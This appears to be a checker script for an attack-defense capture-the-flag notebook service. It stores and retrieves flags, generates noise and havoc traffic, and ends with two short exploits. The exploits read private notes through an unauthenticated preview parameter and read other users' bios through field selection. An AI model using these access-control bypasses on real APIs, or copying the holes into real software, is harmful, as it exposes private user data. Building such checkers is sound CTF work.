# template checker for the template notebook service. copy the structure: one
# putflag/getflag per flag store, a noise pair, a havoc that drives the risky
# features legitimately, and an exploit per store for the gate.
import json
import random
import secrets
from typing import Optional

from httpx import AsyncClient, ConnectError, TimeoutException

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher

SERVICE_PORT = 7000
checker = Enochecker("Notebook", SERVICE_PORT)

FIRST = ["arjun", "meera", "kevin", "lina", "omar", "sofia", "ravi", "nadia", "chen", "ivan"]
WORDS = ["harbor", "manifest", "berth", "crane", "tide", "ledger", "pilot", "cargo", "quay", "beacon"]


def username() -> str:
    return f"{random.choice(FIRST)}_{random.choice(WORDS)}{random.randint(10, 9999)}"


def sentence() -> str:
    return " ".join(random.choice(WORDS) for _ in range(random.randint(4, 10)))


async def call(client: AsyncClient, method: str, path: str, feature: str, **kw):
    # every failure names the feature that broke, never the bug behind it
    try:
        r = await client.request(method, path, **kw)
    except (ConnectError, TimeoutException):
        raise OfflineException(f"{feature}: service unreachable")
    if r.status_code >= 500:
        raise MumbleException(f"{feature}: server error")
    return r


async def account(client: AsyncClient) -> tuple[str, str, str]:
    user, pw = username(), secrets.token_urlsafe(12)
    r = await call(client, "POST", "/register", "register", json={"user": user, "password": pw, "display": user.title()})
    if r.status_code != 201:
        raise MumbleException("register: account not created")
    return user, pw, await login(client, user, pw)


async def login(client: AsyncClient, user: str, pw: str) -> str:
    r = await call(client, "POST", "/login", "login", json={"user": user, "password": pw})
    try:
        return r.json()["token"]
    except (ValueError, KeyError):
        raise MumbleException("login: no session issued")


# store 0: a private note body


@checker.putflag(0)
async def putflag_note(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> str:
    user, pw, tok = await account(client)
    r = await call(client, "POST", "/notes", "notes: create",
                   json={"title": sentence(), "body": task.flag, "private": True},
                   headers={"Authorization": f"Bearer {tok}"})
    try:
        nid = r.json()["id"]
    except (ValueError, KeyError):
        raise MumbleException("notes: create returned no id")
    await db.set("note", {"user": user, "pw": pw, "id": nid})
    return json.dumps({"note_id": nid})


@checker.getflag(0)
async def getflag_note(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    try:
        saved = await db.get("note")
    except KeyError:
        raise MumbleException("notes: missing state from putflag")
    tok = await login(client, saved["user"], saved["pw"])
    r = await call(client, "GET", f"/notes/{saved['id']}", "notes: read",
                   headers={"Authorization": f"Bearer {tok}"})
    if r.status_code != 200 or task.flag not in r.text:
        raise MumbleException("notes: stored note content missing")


# store 1: a profile bio


@checker.putflag(1)
async def putflag_bio(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> str:
    user, pw = username(), secrets.token_urlsafe(12)
    r = await call(client, "POST", "/register", "register",
                   json={"user": user, "password": pw, "display": user.title(), "bio": task.flag})
    if r.status_code != 201:
        raise MumbleException("register: account not created")
    await db.set("bio", {"user": user, "pw": pw})
    return json.dumps({"user": user})


@checker.getflag(1)
async def getflag_bio(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    try:
        saved = await db.get("bio")
    except KeyError:
        raise MumbleException("profile: missing state from putflag")
    tok = await login(client, saved["user"], saved["pw"])
    r = await call(client, "GET", f"/users/{saved['user']}?fields=name,bio", "profile: own fields",
                   headers={"Authorization": f"Bearer {tok}"})
    if r.status_code != 200 or task.flag not in r.text:
        raise MumbleException("profile: own bio missing")


# noise: a public note anyone may read


@checker.putnoise(0)
async def putnoise_public(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    _, _, tok = await account(client)
    text = sentence()
    r = await call(client, "POST", "/notes", "notes: create",
                   json={"title": "public", "body": text, "private": False},
                   headers={"Authorization": f"Bearer {tok}"})
    try:
        await db.set("noise", {"id": r.json()["id"], "text": text})
    except (ValueError, KeyError):
        raise MumbleException("notes: create returned no id")


@checker.getnoise(0)
async def getnoise_public(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    try:
        saved = await db.get("noise")
    except KeyError:
        raise MumbleException("notes: missing state from putnoise")
    r = await call(client, "GET", f"/notes/{saved['id']}", "notes: public read")
    if r.status_code != 200 or saved["text"] not in r.text:
        raise MumbleException("notes: public note content missing")


# havoc: the risky features used the legitimate way, so blanket fixes cost sla


@checker.havoc(0)
async def havoc_features(task: HavocCheckerTaskMessage, client: AsyncClient) -> None:
    user, _, tok = await account(client)
    auth = {"Authorization": f"Bearer {tok}"}
    text = sentence()
    r = await call(client, "POST", "/notes", "notes: create",
                   json={"title": sentence(), "body": text, "private": True}, headers=auth)
    nid = r.json().get("id", "")
    r = await call(client, "GET", f"/notes/{nid}?preview=1", "notes: preview", headers=auth)
    if r.status_code != 200 or text[:32] not in r.text:
        raise MumbleException("notes: preview of own note missing")
    r = await call(client, "GET", f"/users/{user}?fields=display,joined", "profile: field selection")
    if r.status_code != 200 or "joined" not in r.text:
        raise MumbleException("profile: public field selection broken")


# exploits, run only by the gate


@checker.exploit(0)
async def exploit_preview(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
    nid = json.loads(task.attack_info or "{}").get("note_id", "")
    r = await client.get(f"/notes/{nid}?preview=1")
    if flag := searcher.search_flag(r.text):
        return flag
    raise MumbleException("exploit 0 found no flag")


@checker.exploit(1)
async def exploit_fields(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
    user = json.loads(task.attack_info or "{}").get("user", "")
    r = await client.get(f"/users/{user}?fields=bio")
    if flag := searcher.search_flag(r.text):
        return flag
    raise MumbleException("exploit 1 found no flag")


# built once, after every handler above is registered
app = checker.app
